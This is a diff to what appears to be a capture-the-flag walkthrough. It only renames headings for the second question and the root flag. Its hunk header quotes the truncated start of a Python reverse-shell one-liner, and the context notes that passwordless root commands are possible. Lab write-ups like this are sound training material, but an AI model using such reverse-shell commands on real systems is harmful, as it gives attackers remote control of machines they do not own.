@@ -200,7 +200,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ![image](https://user-images.githubusercontent.com/53917092/95254893-f8a76000-07f6-11eb-9793-c4acdad204f9.png)
 
-### answering the first question
+### answering the second question
 
 ![image](https://user-images.githubusercontent.com/53917092/95255082-402dec00-07f7-11eb-8d45-bb296536341f.png)
 
@@ -217,6 +217,6 @@ EASY!!!!!
 
 We can run ANY command as root without password :O
 
-## Root flag
+## Root flag (3rd question)
 
 ![image](https://user-images.githubusercontent.com/53917092/95255573-fdb8df00-07f7-11eb-9447-99a43927e285.png)
